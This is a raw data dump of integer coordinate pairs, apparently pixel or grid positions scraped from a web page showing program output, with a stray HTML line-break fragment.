(42,229), (42,230), (42,231), (42,232), (42,233), (42,234), (42,235), (42,236), (42,253), (42,254), (42,255), (42,256), (42,257), (42,258), (42,259), (42,260), (42,293), (42,294), (42,295), (42,296), (42,297), (42,298), (42,299), (42,300), (42,301), (42,302), (42,303), (42,304), (42,305), (42,306), (42,307), (42,308), (42,309), (42,310), (42,311), (42,312), (42,313), (42,314), (42,315), (42,316), (42,317), (42,318), (42,319), (42,320), (42,321), (42,322), (42,323), (42,324), (42,421), (42,422), (42,423), (42,424), (42,425), (42,426), (42,427), (42,428), (42,477), (42,478), (42,479), (42,480), (42,481), (42,482), (42,483), (42,484), (42,485), (42,486), (42,487), (42,488), (42,489), (42,490), (42,491), (42,492), (43,5), (43,6), (43,7), (43,8), (43,9), (43,10), (43,11), (43,12), (43,93), (43,94), (43,95), (43,96), (43,97), (43,98), (43,99), (43,100), (43,141), (43,142), (43,143), (43,144), (43,145), (43,146), (43,147), (43,148), (43,197), (43,198), (43,199), (43,200), (43,201), (43,202), (43,203), (43,204), (43,229), (43,230), (43,231), (43,232), (43,233), (43,234), (43,235), (43,236), (43,253), (43,254), (43,255), (43,256), (43,257), (43,258), (43,259), (43,260), (43,293), (43,294), (43,295), (43,296), (43,297), (43,298), (43,299), (43,300), (43,301), (43,302), (43,303), (43,304), (43,305), (43,306), (43,307), (43,308), (43,309), (43,310), (43,311), (43,312), (43,313), (43,314), (43,315), (43,316), (43,317), (43,318), (43,319), (43,320), (43,321), (43,322), (43,323), (43,324), (43,421), (43,422), (43,423), (43,424), (43,425), (43,426), (43,427), (43,428), (43,477), (43,478), (43,479), (43,480), (43,481), (43,482), (43,483), (43,484), (43,485), (43,486), (43,487), (43,488), (43,489), (43,490), (43,491), (43,492), (44,5), (44,6), (44,7), (44,8), (44,9), (44,10), (44,11), (44,12), (44,93), (44,94), (44,95), (44,96), (44,97), (44,98), (44,99), (44,100), (44,141), (44,142), (44,143), (44,144), (44,145), (44,146), (44,147), (44,148), (44,197), (44,198), (44,199), (44,200), (44,201), (44,202), (44,203), (44,204), (44,229), (44,230), (44,231), (44,232), (44,233), (44,234), (44,235), (44,236), (44,253), (44,254), (44,255), (44,256), (44,257), (44,258), (44,259), (44,260), (44,293), (44,294), (44,295), (44,296), (44,297), (44,298), (44,299), (44,300), (44,301), (44,302), (44,303), (44,304), (44,305), (44,306), (44,307), (44,308), (44,309), (44,310), (44,311), (44,312), (44,313), (44,314), (44,315), (44,316), (44,317), (44,318), (44,319), (44,320), (44,321), (44,322), (44,323), (44,324), (44,421), (44,422), (44,423), (44,424), (44,425), (44,426), (44,427), (44,428), (44,477), (44,478), (44,479), (44,480), (44,481), (44,482), (44,483), (44,484), (44,485), (44,486), (44,487), (44,488), (44,489), (44,490), (44,491), (44,492), (45,5), (45,6), (45,7), (45,8), (45,9), (45,10), (45,11), (45,12), (45,93), (45,94), (45,95), (45,96), (45,97), (45,98), (45,99), (45,100), (45,141), (45,142), (45,143), (45,144), (45,145), (45,146), (45,147), (45,148), (45,197), (45,198), (45,199), (45,200), (45,201), (45,202), (45,203), (45,204), (45,229), (45,230), (45,231), (45,232), (45,233), (45,234), (45,235), (45,236), (45,253), (45,254), (45,255), (45,256), (45,257), (45,258), (45,259), (45,260), (45,293), (45,294), (45,295), (45,296), (45,297), (45,298), (45,299), (45,300), (45,301), (45,302), (45,303), (45,304), (45,305), (45,306), (45,307), (45,308), (45,309), (45,310), (45,311), (45,312), (45,313), (45,314), (45,315), (45,316), (45,317), (45,318), (45,319), (45,320), (45,321), (45,322), (45,323), (45,324), (45,421), (45,422), (45,423), (45,424), (45,425), (45,426), (45,427), (45,428), (45,477), (45,478), (45,479), (45,480), (45,481), (45,482), (45,483), (45,484), (45,485), (45,486), (45,487), (45,488), (45,489), (45,490), (45,491), (45,492), (46,5), (46,6), (46,7), (46,8), (46,9), (46,10), (46,11), (46,12), (46,93), (46,94), (46,95), (46,96), (46,97), (46,98), (46,99), (46,100), (46,141), (46,142), (46,143), (46,144), (46,145), (46,146), (46,147), (46,148), (46,197), (46,198), (46,199), (46,200), (46,201), (46,202), (46,203), (46,204), (46,229), (46,230), (46,231), (46,232), (46,233), (46,234), (46,235), (46,236), (46,253), (46,254), (46,255), (46,256), (46,257), (46,258), (46,259), (46,260), (46,293), (46,294), (46,295), (46,296), (46,297), (46,298), (46,299), (46,300), (46,301), (46,302), (46,303), (46,304), (46,305), (46,306), (46,307), (46,308), (46,309), (46,310), (46,311), (46,312), (46,313), (46,314), (46,315), (46,316), (46,317), (46,318), (46,319), (46,320), (46,321), (46,322), (46,323), (46,324), (46,421), (46,422), (46,423), (46,424), (46,425), (46,426), (46,427), (46,428), (46,477), (46,478), (46,479), (46,480), (46,481), (46,482), (46,483), (46,484), (46,485), (46,486), (46,487), (46,488), (46,489), (46,490), (46,491), (46,492), (47,5), (47,6), (47,7), (47,8), (47,9), (47,10), (47,11), (47,12), (47,93), (47,94), (47,95), (47,96), (47,97), (47,98), (47,99), (47,100), (47,141), (47,142), (47,143), (47,144), (47,145), (47,146), (47,147), (47,148), (47,197), (47,198), (47,199), (47,200), (47,201), (47,202), (47,203), (47,204), (47,229), (47,230), (47,231), (47,232), (47,233), (47,234), (47,235), (47,236), (47,253), (47,254), (47,255), (47,256), (47,257), (47,258), (47,259), (47,260), (47,293), (47,294), (47,295), (47,296), (47,297), (47,298), (47,299), (47,300), (47,301), (47,302), (47,303), (47,304), (47,305), (47,306), (47,307), (47,308), (47,309), (47,310), (47,311), (47,312), (47,313), (47,314), (47,315), (47,316), (47,317), (47,318), (47,319), (47,320), (47,321), (47,322), (47,323), (47,324), (47,421), (47,422), (47,423), (47,424), (47,425), (47,426), (47,427), (47,428), (47,477), (47,478), (47,479), (47,480), (47,481), (47,482), (47,483), (47,484), (47,485), (47,486), (47,487), (47,488), (47,489), (47,490), (47,491), (47,492), (48,5), (48,6), (48,7), (48,8), (48,9), (48,10), (48,11), (48,12), (48,93), (48,94), (48,95), (48,96), (48,97), (48,98), (48,99), (48,100), (48,141), (48,142), (48,143), (48,144), (48,145), (48,146), (48,147), (48,148), (48,197), (48,198), (48,199), (48,200), (48,201), (48,202), (48,203), (48,204), (48,229), (48,230), (48,231), (48,232), (48,233), (48,234), (48,235), (48,236), (48,253), (48,254), (48,255), (48,256), (48,257), (48,258), (48,259), (48,260), (48,293), (48,294), (48,295), (48,296), (48,297), (48,298), (48,299), (48,300), (48,413), (48,414), (48,415), (48,416), (48,417), (48,418), (48,419), (48,420), (48,421), (48,422), (48,423), (48,424), (48,425), (48,426), (48,427), (48,428), (48,429), (48,430), (48,431), (48,432), (48,433), (48,434), (48,435), (48,436), (48,477), (48,478), (48,479), (48,480), (48,481), (48,482), (48,483), (48,484), (49,5), (49,6), (49,7), (49,8), (49,9), (49,10), (49,11), (49,12), (49,93), (49,94), (49,95), (49,96), (49,97), (49,98), (49,99), (49,100), (49,141), (49,142), (49,143), (49,144), (49,145), (49,146), (49,147), (49,148), (49,197), (49,198), (49,199), (49,200), (49,201), (49,202), (49,203), (49,204), (49,229), (49,230), (49,231), (49,232), (49,233), (49,234), (49,235), (49,236), (49,253), (49,254), (49,255), (49,256), (49,257), (49,258), (49,259), (49,260), (49,293), (49,294), (49,295), (49,296), (49,297), (49,298), (49,299), (49,300), (49,413), (49,414), (49,415), (49,416), (49,417), (49,418), (49,419), (49,420), (49,421), (49,422), (49,423), (49,424), (49,425), (49,426), (49,427), (49,428), (49,429), (49,430), (49,431), (49,432), (49,433), (49,434), (49,435), (49,436), (49,477), (49,478), (49,479), (49,480), (49,481), (49,482), (49,483), (49,484), (50,5), (50,6), (50,7), (50,8), (50,9), (50,10), (50,11), (50,12), (50,93), (50,94), (50,95), (50,96), (50,97), (50,98), (50,99), (50,100), (50,141), (50,142), (50,143), (50,144), (50,145), (50,146), (50,147), (50,148), (50,197), (50,198), (50,199), (50,200), (50,201), (50,202), (50,203), (50,204), (50,229), (50,230), (50,231), (50,232), (50,233), (50,234), (50,235), (50,236), (50,253), (50,254), (50,255), (50,256), (50,257), (50,258), (50,259), (50,260), (50,293), (50,294), (50,295), (50,296), (50,297), (50,298), (50,299), (50,300), (50,413), (50,414), (50,415), (50,416), (50,417), (50,418), (50,419), (50,420), (50,421), (50,422), (50,423), (50,424), (50,425), (50,426), (50,427), (50,428), (50,429), (50,430), (50,431), (50,432), (50,433), (50,434), (50,435), (50,436), (50,477), (50,478), (50,479), (50,480), (50,481), (50,482), (50,483), (50,484), (51,5), (51,6), (51,7), (51,8), (51,9), (51,10), (51,11), (51,12), (51,93), (51,94), (51,95), (51,96), (51,97), (51,98), (51,99), (51,100), (51,141), (51,142), (51,143), (51,144), (51,145), (51,146), (51,147), (51,148), (51,197), (51,198), (51,199), (51,200), (51,201), (51,202), (51,203), (51,204), (51,229), (51,230), (51,231), (51,232), (51,233), (51,234), (51,235), (51,236), (51,253), (51,254), (51,255), (51,256), (51,257), (51,258), (51,259), (51,260), (51,293), (51,294), (51,295), (51,296), (51,297), (51,298), (51,299), (51,300), (51,413), (51,414), (51,415), (51,416), (51,417), (51,418), (51,419), (51,420), (51,421), (51,422), (51,423), (51,424), (51,425), (51,426), (51,427), (51,428), (51,429), (51,430), (51,431), (51,432), (51,433), (51,434), (51,435), (51,436), (51,477), (51,478), (51,479), (51,480), (51,481), (51,482), (51,483), (51,484), (52,5), (52,6), (52,7), (52,8), (52,9), (52,10), (52,11), (52,12), (52,93), (52,94), (52,95), (52,96), (52,97), (52,98), (52,99), (52,100), (52,141), (52,142), (52,143), (52,144), (52,145), (52,146), (52,147), (52,148), (52,197), (52,198), (52,199), (52,200), (52,201), (52,202), (52,203), (52,204), (52,229), (52,230), (52,231), (52,232), (52,233), (52,234), (52,235), (52,236), (52,253), (52,254), (52,255), (52,256), (52,257), (52,258), (52,259), (52,260), (52,293), (52,294), (52,295), (52,296), (52,297), (52,298), (52,299), (52,300), (52,413), (52,414), (52,415), (52,416), (52,417), (52,418), (52,419), (52,420), (52,421), (52,422), (52,423), (52,424), (52,425), (52,426), (52,427), (52,428), (52,429), (52,430), (52,431), (52,432), (52,433), (52,434), (52,435), (52,436), (52,477), (52,478), (52,479), (52,480), (52,481), (52,482), (52,483), (52,484), (53,5), (53,6), (53,7), (53,8), (53,9), (53,10), (53,11), (53,12), (53,93), (53,94), (53,95), (53,96), (53,97), (53,98), (53,99), (53,100), (53,141), (53,142), (53,143), (53,144), (53,145), (53,146), (53,147), (53,148), (53,197), (53,198), (53,199), (53,200), (53,201), (53,202), (53,203), (53,204), (53,229), (53,230), (53,231), (53,232), (53,233), (53,234), (53,235), (53,236), (53,253), (53,254), (53,255), (53,256), (53,257), (53,258), (53,259), (53,260), (53,293), (53,294), (53,295), (53,296), (53,297), (53,298), (53,299), (53,300), (53,413), (53,414), (53,415), (53,416), (53,417), (53,418), (53,419), (53,420), (53,421), (53,422), (53,423), (53,424), (53,425), (53,426), (53,427), (53,428), (53,429), (53,430), (53,431), (53,432), (53,433), (53,434), (53,435), (53,436), (53,477), (53,478), (53,479), (53,480), (53,481), (53,482), (53,483), (53,484), (54,5), (54,6), (54,7), (54,8), (54,9), (54,10), (54,11), (54,12), (54,93), (54,94), (54,95), (54,96), (54,97), (54,98), (54,99), (54,100), (54,141), (54,142), (54,143), (54,144), (54,145), (54,146), (54,147), (54,148), (54,197), (54,198), (54,199), (54,200), (54,201), (54,202), (54,203), (54,204), (54,229), (54,230), (54,231), (54,232), (54,233), (54,234), (54,235), (54,236), (54,253), (54,254), (54,255), (54,256), (54,257), (54,258), (54,259), (54,260), (54,293), (54,294), (54,295), (54,296), (54,297), (54,298), (54,299), (54,300), (54,413), (54,414), (54,415), (54,416), (54,417), (54,418), (54,419), (54,420), (54,421), (54,422), (54,423), (54,424), (54,425), (54,426), (54,427), (54,428), (54,429), (54,430), (54,431), (54,432), (54,433), (54,434), (54,435), (54,436), (54,477), (54,478), (54,479), (54,480), (54,481), (54,482), (54,483), (54,484), (55,5), (55,6), (55,7), (55,8), (55,9), (55,10), (55,11), (55,12), (55,93), (55,94), (55,95), (55,96), (55,97), (55,98), (55,99), (55,100), (55,141), (55,142), (55,143), (55,144), (55,145), (55,146), (55,147), (55,148), (55,197), (55,198), (55,199), (55,200), (55,201), (55,202), (55,203), (55,204), (55,229), (55,230), (55,231), (55,232), (55,233), (55,234), (55,235), (55,236), (55,253), (55,254), (55,255), (55,256), (55,257), (55,258), (55,259), (55,260), (55,293), (55,294), (55,295), (55,296), (55,297), (55,298), (55,299), (55,300), (55,413), (55,414), (55,415), (55,416), (55,417), (55,418), (55,419), (55,420), (55,421), (55,422), (55,423), (55,424), (55,425), (55,426), (55,427), (55,428), (55,429), (55,430), (55,431), (55,432), (55,433), (55,434), (55,435), (55,436), (55,477), (55,478), (55,479), (55,480), (55,481), (55,482), (55,483), (55,484), (56,5), (56,6), (56,7), (56,8), (56,9), (56,10), (56,11), (56,12), (56,93), (56,94), (56,95), (56,96), (56,97), (56,98), (56,99), (56,100), (56,141), (56,142), (56,143), (56,144), (56,145), (56,146), (56,147), (56,148), (56,197), (56,198), (56,199), (56,200), (56,201), (56,202), (56,203), (56,204), (56,237), (56,238), (56,239), (56,240), (56,241), (56,242), (56,243), (56,244), (56,253), (56,254), (56,255), (56,256), (56,257), (56,258), (56,259), (56,260), (56,293), (56,294), (56,295), (56,296), (56,297), (56,298), (56,299), (56,300), (56,405), (56,406), (56,407), (56,408), (56,409), (56,410), (56,411), (56,412), (56,413), (56,414), (56,415), (56,416), (56,417), (56,418), (56,419), (56,420), (56,429), (56,430), (56,431), (56,432), (56,433), (56,434), (56,435), (56,436), (56,437), (56,438), (56,439), (56,440), (56,441), (56,442), (56,443), (56,444), (56,477), (56,478), (56,479), (56,480), (56,481), (56,482), (56,483), (56,484), (57,5), (57,6), (57,7), (57,8), (57,9), (57,10), (57,11), (57,12), (57,93), (57,94), (57,95), (57,96), (57,97), (57,98), (57,99), (57,100), (57,141), (57,142), (57,143), (57,144), (57,145), (57,146), (57,147), (57,148), (57,197), (57,198), (57,199), (57,200), (57,201), (57,202), (57,203), (57,204), (57,237), (57,238), (57,239), (57,240), (57,241), (57,242), (57,243), (57,244), (57,253), (57,254), (57,255), (57,256), (57,257), (57,258), (57,259), (57,260), (57,293), (57,294), (57,295), (57,296), (57,297), (57,298), (57,299), (57,300), (57,405), (57,406), (57,407), (57,408), (57,409), (57,410), (57,411), (57,412), (57,413), (57,414), (57,415), (57,416), (57,417), (57,418), (57,419), (57,420), (57,429), (57,430), (57,431), (57,432), (57,433), (57,434), (57,435), (57,436), (57,437), (57,438), (57,439), (57,440), (57,441), (57,442), (57,443), (57,444), (57,477), (57,478), (57,479), (57,480), (57,481), (57,482), (57,483), (57,484), (58,5), (58,6), (58,7), (58,8), (58,9), (58,10), (58,11), (58,12), (58,93), (58,94), (58,95), (58,96), (58,97), (58,98), (58,99), (58,100), (58,141), (58,142), (58,143), (58,144), (58,145), (58,146), (58,147), (58,148), (58,197), (58,198), (58,199), (58,200), (58,201), (58,202), (58,203), (58,204), (58,237), (58,238), (58,239), (58,240), (58,241), (58,242), (58,243), (58,244), (58,253), (58,254), (58,255), (58,256), (58,257), (58,258), (58,259), (58,260), (58,293), (58,294), (58,295), (58,296), (58,297), (58,298), (58,299), (58,300), (58,405), (58,406), (58,407), (58,408), (58,409), (58,410), (58,411), (58,412), (58,413), (58,414), (58,415), (58,416), (58,417), (58,418), (58,419), (58,420), (58,429), (58,430), (58,431), (58,432), (58,433), (58,434), (58,435), (58,436), (58,437), (58,438), (58,439), (58,440), (58,441), (58,442), (58,443), (58,444), (58,477), (58,478), (58,479), (58,480), (58,481), (58,482), (58,483), (58,484), (59,5), (59,6), (59,7), (59,8), (59,9), (59,10), (59,11), (59,12), (59,93), (59,94), (59,95), (59,96), (59,97), (59,98), (59,99), (59,100), (59,141), (59,142), (59,143), (59,144), (59,145), (59,146), (59,147), (59,148), (59,197), (59,198), (59,199), (59,200), (59,201), (59,202), (59,203), (59,204), (59,237), (59,238), (59,239), (59,240), (59,241), (59,242), (59,243), (59,244), (59,253), (59,254), (59,255), (59,256), (59,257), (59,258), (59,259), (59,260), (59,293), (59,294), (59,295), (59,296), (59,297), (59,298), (59,299), (59,300), (59,405), (59,406), (59,407), (59,408), (59,409), (59,410), (59,411), (59,412), (59,413), (59,414), (59,415), (59,416), (59,417), (59,418), (59,419), (59,420), (59,429), (59,430), (59,431), (59,432), (59,433), (59,434), (59,435), (59,436), (59,437), (59,438), (59,439), (59,440), (59,441), (59,442), (59,443), (59,444), (59,477), (59,478), (59,479), (59,480), (59,481), (59,482), (59,483), (59,484), (60,5), (60,6), (60,7), (60,8), (60,9), (60,10), (60,11), (60,12), (60,93), (60,94), (60,95), (60,96), (60,97), (60,98), (60,99), (60,100), (60,141), (60,142), (60,143), (60,144), (60,145), (60,146), (60,147), (60,148), (60,197), (60,198), (60,199), (60,200), (60,201), (60,202), (60,203), (60,204), (60,237), (60,238), (60,239), (60,240), (60,241), (60,242), (60,243), (60,244), (60,253), (60,254), (60,255), (60,256), (60,257), (60,258), (60,259), (60,260), (60,293), (60,294), (60,295), (60,296), (60,297), (60,298), (60,299), (60,300), (60,405), (60,406), (60,407), (60,408), (60,409), (60,410), (60,411), (60,412), (60,413), (60,414), (60,415), (60,416), (60,417), (60,418), (60,419), (60,420), (60,429), (60,430), (60,431), (60,432), (60,433), (60,434), (60,435), (60,436), (60,437), (60,438), (60,439), (60,440), (60,441), (60,442), (60,443), (60,444), (60,477), (60,478), (60,479), (60,480), (60,481), (60,482), (60,483), (60,484), (61,5), (61,6), (61,7), (61,8), (61,9), (61,10), (61,11), (61,12), (61,93), (61,94), (61,95), (61,96), (61,97), (61,98), (61,99), (61,100), (61,141), (61,142), (61,143), (61,144), (61,145), (61,146), (61,147), (61,148), (61,197), (61,198), (61,199), (61,200), (61,201), (61,202), (61,203), (61,204), (61,237), (61,238), (61,239), (61,240), (61,241), (61,242), (61,243), (61,244), (61,253), (61,254), (61,255), (61,256), (61,257), (61,258), (61,259), (61,260), (61,293), (61,294), (61,295), (61,296), (61,297), (61,298), (61,299), (61,300), (61,405), (61,406), (61,407), (61,408), (61,409), (61,410), (61,411), (61,412), (61,413), (61,414), (61,415), (61,416), (61,417), (61,418), (61,419), (61,420), (61,429), (61,430), (61,431), (61,432), (61,433), (61,434), (61,435), (61,436), (61,437), (61,438), (61,439), (61,440), (61,441), (61,442), (61,443), (61,444), (61,477), (61,478), (61,479), (61,480), (61,481), (61,482), (61,483), (61,484), (62,5), (62,6), (62,7), (62,8), (62,9), (62,10), (62,11), (62,12), (62,93), (62,94), (62,95), (62,96), (62,97), (62,98), (62,99), (62,100), (62,141), (62,142), (62,143), (62,144), (62,145), (62,146), (62,147), (62,148), (62,197), (62,198), (62,199), (62,200), (62,201), (62,202), (62,203), (62,204), (62,237), (62,238), (62,239), (62,240), (62,241), (62,242), (62,243), (62,244), (62,253), (62,254), (62,255), (62,256), (62,257), (62,258), (62,259), (62,260), (62,293), (62,294), (62,295), (62,296), (62,297), (62,298), (62,299), (62,300), (62,405), (62,406), (62,407), (62,408), (62,409), (62,410), (62,411), (62,412), (62,413), (62,414), (62,415), (62,416), (62,417), (62,418), (62,419), (62,420), (62,429), (62,430), (62,431), (62,432), (62,433), (62,434), (62,435), (62,436), (62,437), (62,438), (62,439), (62,440), (62,441), (62,442), (62,443), (62,444), (62,477), (62,478), (62,479), (62,480), (62,481), (62,482), (62,483), (62,484), (63,5), (63,6), (63,7), (63,8), (63,9), (63,10), (63,11), (63,12), (63,93), (63,94), (63,95), (63,96), (63,97), (63,98), (63,99), (63,100), (63,141), (63,142), (63,143), (63,144), (63,145), (63,146), (63,147), (63,148), (63,197), (63,198), (63,199), (63,200), (63,201), (63,202), (63,203), (63,204), (63,237), (63,238), (63,239), (63,240), (63,241), (63,242), (63,243), (63,244), (63,253), (63,254), (63,255), (63,256), (63,257), (63,258), (63,259), (63,260), (63,293), (63,294), (63,295), (63,296), (63,297), (63,298), (63,299), (63,300), (63,405), (63,406), (63,407), (63,408), (63,409), (63,410), (63,411), (63,412), (63,413), (63,414), (63,415), (63,416), (63,417), (63,418), (63,419), (63,420), (63,429), (63,430), (63,431), (63,432), (63,433), (63,434), (63,435), (63,436), (63,437), (63,438), (63,439), (63,440), (63,441), (63,442), (63,443), (63,444), (63,477), (63,478), (63,479), (63,480), (63,481), (63,482), (63,483), (63,484), (64,5), (64,6), (64,7), (64,8), (64,9), (64,10), (64,11), (64,12), (64,93), (64,94), (64,95), (64,96), (64,97), (64,98), (64,99), (64,100), (64,149), (64,150), (64,151), (64,152), (64,153), (64,154), (64,155), (64,156), (64,189), (64,190), (64,191), (64,192), (64,193), (64,194), (64,195), (64,196), (64,237), (64,238), (64,239), (64,240), (64,241), (64,242), (64,243), (64,244), (64,245), (64,246), (64,247), (64,248), (64,249), (64,250), (64,251), (64,252), (64,293), (64,294), (64,295), (64,296), (64,297), (64,298), (64,299), (64,300), (64,405), (64,406), (64,407), (64,408), (64,409), (64,410), (64,411), (64,412), (64,437), (64,438), (64,439), (64,440), (64,441), (64,442), (64,443), (64,444), (64,477), (64,478), (64,479), (64,480), (64,481), (64,482), (64,483), (64,484), (65,5), (65,6), (65,7), (65,8), (65,9), (65,10), (65,11), (65,12), (65,93), (65,94), (65,95), (65,96), (65,97), (65,98), (65,99), (65,100), (65,149), (65,150), (65,151), (65,152), (65,153), (65,154), (65,155), (65,156), (65,189), (65,190), (65,191), (65,192), (65,193), (65,194), (65,195), (65,196), (65,237), (65,238), (65,239), (65,240), (65,241), (65,242), (65,243), (65,244), (65,245), (65,246), (65,247), (65,248), (65,249), (65,250), (65,251), (65,252), (65,293), (65,294), (65,295), (65,296), (65,297), (65,298), (65,299), (65,300), (65,405), (65,406), (65,407), (65,408), (65,409), (65,410), (65,411), (65,412), (65,437), (65,438), (65,439), (65,440), (65,441), (65,442), (65,443), (65,444), (65,477), (65,478), (65,479), (65,480), (65,481), (65,482), (65,483), (65,484), (66,5), (66,6), (66,7), (66,8), (66,9), (66,10), (66,11), (66,12), (66,93), (66,94), (66,95), (66,96), (66,97), (66,98), (66,99), (66,100), (66,149), (66,150), (66,151), (66,152), (66,153), (66,154), (66,155), (66,156), (66,189), (66,190), (66,191), (66,192), (66,193), (66,194), (66,195), (66,196), (66,237), (66,238), (66,239), (66,240), (66,241), (66,242), (66,243), (66,244), (66,245), (66,246), (66,247), (66,248), (66,249), (66,250), (66,251), (66,252), (66,293), (66,294), (66,295), (66,296), (66,297), (66,298), (66,299), (66,300), (66,405), (66,406), (66,407), (66,408), (66,409), (66,410), (66,411), (66,412), (66,437), (66,438), (66,439), (66,440), (66,441), (66,442), (66,443), (66,444), (66,477), (66,478), (66,479), (66,480), (66,481), (66,482), (66,483), (66,484), (67,5), (67,6), (67,7), (67,8), (67,9), (67,10), (67,11), (67,12), (67,93), (67,94), (67,95), (67,96), (67,97), (67,98), (67,99), (67,100), (67,149), (67,150), (67,151), (67,152), (67,153), (67,154), (67,155), (67,156), (67,189), (67,190), (67,191), (67,192), (67,193), (67,194), (67,195), (67,196), (67,237), (67,238), (67,239), (67,240), (67,241), (67,242), (67,243), (67,244), (67,245), (67,246), (67,247), (67,248), (67,249), (67,250), (67,251), (67,252), (67,293), (67,294), (67,295), (67,296), (67,297), (67,298), (67,299), (67,300), (67,405), (67,406), (67,407), (67,408), (67,409), (67,410), (67,411), (67,412), (67,437), (67,438), (67,439), (67,440), (67,441), (67,442), (67,443), (67,444), (67,477), (67,478), (67,479), (67,480), (67,481), (67,482), (67,483), (67,484), (68,5), (68,6), (68,7), (68,8), (68,9), (68,10), (68,11), (68,12), (68,93), (68,94), (68,95), (68,96), (68,97), (68,98), (68,99), (68,100), (68,149), (68,150), (68,151), (68,152), (68,153), (68,154), (68,155), (68,156), (68,189), (68,190), (68,191), (68,192), (68,193), (68,194), (68,195), (68,196), (68,237), (68,238), (68,239), (68,240), (68,241), (68,242), (68,243), (68,244), (68,245), (68,246), (68,247), (68,248), (68,249), (68,250), (68,251), (68,252), (68,293), (68,294), (68,295), (68,296), (68,297), (68,298), (68,299), (68,300), (68,405), (68,406), (68,407), (68,408), (68,409), (68,410), (68,411), (68,412), (68,437), (68,438), (68,439), (68,440), (68,441), (68,442), (68,443), (68,444), (68,477), (68,478), (68,479), (68,480), (68,481), (68,482), (68,483), (68,484), (69,5), (69,6), (69,7), (69,8), (69,9), (69,10), (69,11), (69,12), (69,93), (69,94), (69,95), (69,96), (69,97), (69,98), (69,99), (69,100), (69,149), (69,150), (69,151), (69,152), (69,153), (69,154), (69,155), (69,156), (69,189), (69,190), (69,191), (69,192), (69,193), (69,194), (69,195), (69,196), (69,237), (69,238), (69,239), (69,240), (69,241), (69,242), (69,243), (69,244), (69,245), (69,246), (69,247), (69,248), (69,249), (69,250), (69,251), (69,252), (69,293), (69,294), (69,295), (69,296), (69,297), (69,298), (69,299), (69,300), (69,405), (69,406), (69,407), (69,408), (69,409), (69,410), (69,411), (69,412), (69,437), (69,438), (69,439), (69,440), (69,441), (69,442), (69,443), (69,444), (69,477), (69,478), (69,479), (69,480), (69,481), (69,482), (69,483), (69,484), (70,5), (70,6), (70,7), (70,8), (70,9), (70,10), (70,11), (70,12), (70,93), (70,94), (70,95), (70,96), (70,97), (70,98), (70,99), (70,100), (70,149), (70,150), (70,151), (70,152), (70,153), (70,154), (70,155), (70,156), (70,189), (70,190), (70,191), (70,192), (70,193), (70,194), (70,195), (70,196), (70,237), (70,238), (70,239), (70,240), (70,241), (70,242), (70,243), (70,244), (70,245), (70,246), (70,247), (70,248), (70,249), (70,250), (70,251), (70,252), (70,293), (70,294), (70,295), (70,296), (70,297), (70,298), (70,299), (70,300), (70,405), (70,406), (70,407), (70,408), (70,409), (70,410), (70,411), (70,412), (70,437), (70,438), (70,439), (70,440), (70,441), (70,442), (70,443), (70,444), (70,477), (70,478), (70,479), (70,480), (70,481), (70,482), (70,483), (70,484), (71,5), (71,6), (71,7), (71,8), (71,9), (71,10), (71,11), (71,12), (71,93), (71,94), (71,95), (71,96), (71,97), (71,98), (71,99), (71,100), (71,149), (71,150), (71,151), (71,152), (71,153), (71,154), (71,155), (71,156), (71,189), (71,190), (71,191), (71,192), (71,193), (71,194), (71,195), (71,196), (71,237), (71,238), (71,239), (71,240), (71,241), (71,242), (71,243), (71,244), (71,245), (71,246), (71,247), (71,248), (71,249), (71,250), (71,251), (71,252), (71,293), (71,294), (71,295), (71,296), (71,297), (71,298), (71,299), (71,300), (71,405), (71,406), (71,407), (71,408), (71,409), (71,410), (71,411), (71,412), (71,437), (71,438), (71,439), (71,440), (71,441), (71,442), (71,443), (71,444), (71,477), (71,478), (71,479), (71,480), (71,481), (71,482), (71,483), (71,484), (72,5), (72,6), (72,7), (72,8), (72,9), (72,10), (72,11), (72,12), (72,29), (72,30), (72,31), (72,32), (72,33), (72,34), (72,35), (72,36), (72,37), (72,38), (72,39), (72,40), (72,41), (72,42), (72,43), (72,44), (72,45), (72,46), (72,47), (72,48), (72,49), (72,50), (72,51), (72,52), (72,53), (72,54), (72,55), (72,56), (72,57), (72,58), (72,59), (72,60), (72,61), (72,62), (72,63), (72,64), (72,65), (72,66), (72,67), (72,68), (72,69), (72,70), (72,71), (72,72), (72,73), (72,74), (72,75), (72,76), (72,77), (72,78), (72,79), (72,80), (72,81), </span><br><span class="line">(72,82), (72,83), (72,84), (72,93), (72,94), (72,95), (72,96), (72,97), (72,98), (72,99), (72,100), (72,101), (72,102), (72,103), (72,104), (72,105), (72,106), (72,107), (72,108), (72,109), (72,110), (72,111), (72,112), (72,113), (72,114), (72,115), (72,116), (72,117), (72,118), (72,119), (72,120), (72,121), (72,122), (72,123), (72,124), (72,125), (72,126), (72,127), (72,128), (72,129), (72,130), (72,131), (72,132), (72,157), (72,158), (72,159), (72,160), (72,161), (72,162), (72,163), (72,164), (72,165), (72,166), (72,167), (72,168), (72,169), (72,170), (72,171), (72,172), (72,173), (72,174), (72,175), (72,176), (72,177), (72,178), (72,179), (72,180), (72,181), (72,182), (72,183), (72,184), (72,185), (72,186), (72,187), (72,188), (72,237), (72,238), (72,239), (72,240), (72,241), (72,242), (72,243), (72,244), (72,245), (72,246), (72,247), (72,248), (72,249), (72,250), (72,251), (72,252), (72,293), (72,294), (72,295), (72,296), (72,297), (72,298), (72,299), (72,300), (72,301), (72,302), (72,303), (72,304), (72,305), (72,306), (72,307), (72,308), (72,309), (72,310), (72,311), (72,312), (72,313), (72,314), (72,315), (72,316), (72,317), (72,318), (72,319), (72,320), (72,321), (72,322), (72,323), (72,324), (72,325), (72,326), (72,327), (72,328), (72,329), (72,330), (72,331), (72,332), (72,341), (72,342), (72,343), (72,344), (72,345), (72,346), (72,347), (72,348), (72,349), (72,350), (72,351), (72,352), (72,353), (72,354), (72,355), (72,356), (72,357), (72,358), (72,359), (72,360), (72,361), (72,362), (72,363), (72,364), (72,365), (72,366), (72,367), (72,368), (72,369), (72,370), (72,371), (72,372), (72,373), (72,374), (72,375), (72,376), (72,377), (72,378), (72,379), (72,380), (72,381), (72,382), (72,383), (72,384), (72,385), (72,386), (72,387), (72,388), (72,397), (72,398), (72,399), (72,400), (72,401), (72,402), (72,403), (72,404), (72,445), (72,446), (72,447), (72,448), (72,449), (72,450), (72,451), (72,452), (72,477), (72,478), (72,479), (72,480), (72,481), (72,482), (72,483), (72,484), (73,5), (73,6), (73,7), (73,8), (73,9), (73,10), (73,11), (73,12), (73,29), (73,30), (73,31), (73,32), (73,33), (73,34), (73,35), (73,36), (73,37), (73,38), (73,39), (73,40), (73,41), (73,42), (73,43), (73,44), (73,45), (73,46), (73,47), (73,48), (73,49), 